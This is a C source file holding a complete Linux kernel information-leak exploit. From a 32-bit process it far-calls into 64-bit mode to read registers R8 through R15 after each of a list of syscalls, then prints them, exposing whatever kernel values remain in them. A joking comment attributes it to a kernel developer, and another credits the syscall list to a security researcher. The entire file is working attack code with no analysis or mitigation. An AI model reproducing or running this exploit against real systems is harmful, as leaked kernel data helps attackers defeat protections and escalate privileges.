/* written by Ingo Molnar -- it's true because this comment says the exploit
   was written by him!
*/

#include <stdio.h>
#include <sys/syscall.h>

unsigned int _r81;
unsigned int _r82;
unsigned int _r91;
unsigned int _r92;
unsigned int _r101;
unsigned int _r102;
unsigned int _r111;
unsigned int _r112;
unsigned int _r121;
unsigned int _r122;
unsigned int _r131;
unsigned int _r132;
unsigned int _r141;
unsigned int _r142;
unsigned int _r151;
unsigned int _r152;

int leak_it(void)
{
	asm volatile (
	".intel_syntax noprefix\n"
	".code32\n"
	"jmp label1\n"
	"farcalllabel1:\n"
	".code64\n"
	"mov eax, r8d\n"
	"shr r8, 32\n"
	"mov ebx, r8d\n"
	"mov ecx, r9d\n"
	"shr r9, 32\n"
	"mov edx, r9d\n"
	"mov esi, r10d\n"
	"shr r10, 32\n"
	"mov edi, r10d\n"
	".att_syntax noprefix\n"
	"lret\n"
	".intel_syntax noprefix\n"
	"farcalllabel2:\n"
	"mov eax, r11d\n"
	"shr r11, 32\n"
	"mov ebx, r11d\n"
	"mov ecx, r12d\n"
	"shr r12, 32\n"
	"mov edx, r12d\n"
	"mov esi, r13d\n"
	"shr r13, 32\n"
	"mov edi, r13d\n"
	".att_syntax noprefix\n"
	"lret\n"
	".intel_syntax noprefix\n"
	"farcalllabel3:\n"
	"mov eax, r14d\n"
	"shr r14, 32\n"
	"mov ebx, r14d\n"
	"mov ecx, r15d\n"
	"shr r15, 32\n"
	"mov edx, r15d\n"
	".att_syntax noprefix\n"
	"lret\n"
	".intel_syntax noprefix\n"
	".code32\n"
	"label1:\n"
	".att_syntax noprefix\n"
	"lcall $0x33, $farcalllabel1\n"
	".intel_syntax noprefix\n"
	"mov _r81, eax\n"
	"mov _r82, ebx\n"
	"mov _r91, ecx\n"
	"mov _r92, edx\n"
	"mov _r101, esi\n"
	"mov _r102, edi\n"
	".att_syntax noprefix\n"
	"lcall $0x33, $farcalllabel2\n"
	".intel_syntax noprefix\n"
	"mov _r111, eax\n"
	"mov _r112, ebx\n"
	"mov _r121, ecx\n"
	"mov _r122, edx\n"
	"mov _r131, esi\n"
	"mov _r132, edi\n"
	".att_syntax noprefix\n"
	"lcall $0x33, $farcalllabel3\n"
	".intel_syntax noprefix\n"
	"mov _r141, eax\n"
	"mov _r142, ebx\n"
	"mov _r151, ecx\n"
	"mov _r152, edx\n"
	".att_syntax noprefix\n"
	);

	printf(" R8=%08x%08x\n", _r82, _r81);
	printf(" R9=%08x%08x\n", _r92, _r91);
	printf("R10=%08x%08x\n", _r102, _r101);
	printf("R11=%08x%08x\n", _r112, _r111);
	printf("R12=%08x%08x\n", _r122, _r121);
	printf("R13=%08x%08x\n", _r132, _r131);
	printf("R14=%08x%08x\n", _r142, _r141);
	printf("R15=%08x%08x\n", _r152, _r151);
	return 0;
}

/* ripped from jon oberheide */
const int randcalls[] = {
	__NR_read, __NR_write, __NR_open, __NR_close, __NR_stat, __NR_lstat,
	__NR_lseek, __NR_rt_sigaction, __NR_rt_sigprocmask, __NR_ioctl,
	__NR_access, __NR_pipe, __NR_sched_yield, __NR_mremap, __NR_dup,
	__NR_dup2, __NR_getitimer, __NR_setitimer, __NR_getpid, __NR_fcntl,
	__NR_flock, __NR_getdents, __NR_getcwd, __NR_gettimeofday,
	__NR_getrlimit, __NR_getuid, __NR_getgid, __NR_geteuid, __NR_getegid,
	__NR_getppid, __NR_getpgrp, __NR_getgroups, __NR_getresuid,
	__NR_getresgid, __NR_getpgid, __NR_getsid,__NR_getpriority,
	__NR_sched_getparam, __NR_sched_get_priority_max
};

int main(void)
{
	/* to keep random stack values from being used for pointers in syscalls */
	char buf[64] = {};
	int call;
	for (call = 0; call < sizeof(randcalls)/sizeof(randcalls[0]); call++) {
		syscall(randcalls[call]);
		leak_it();
	}

}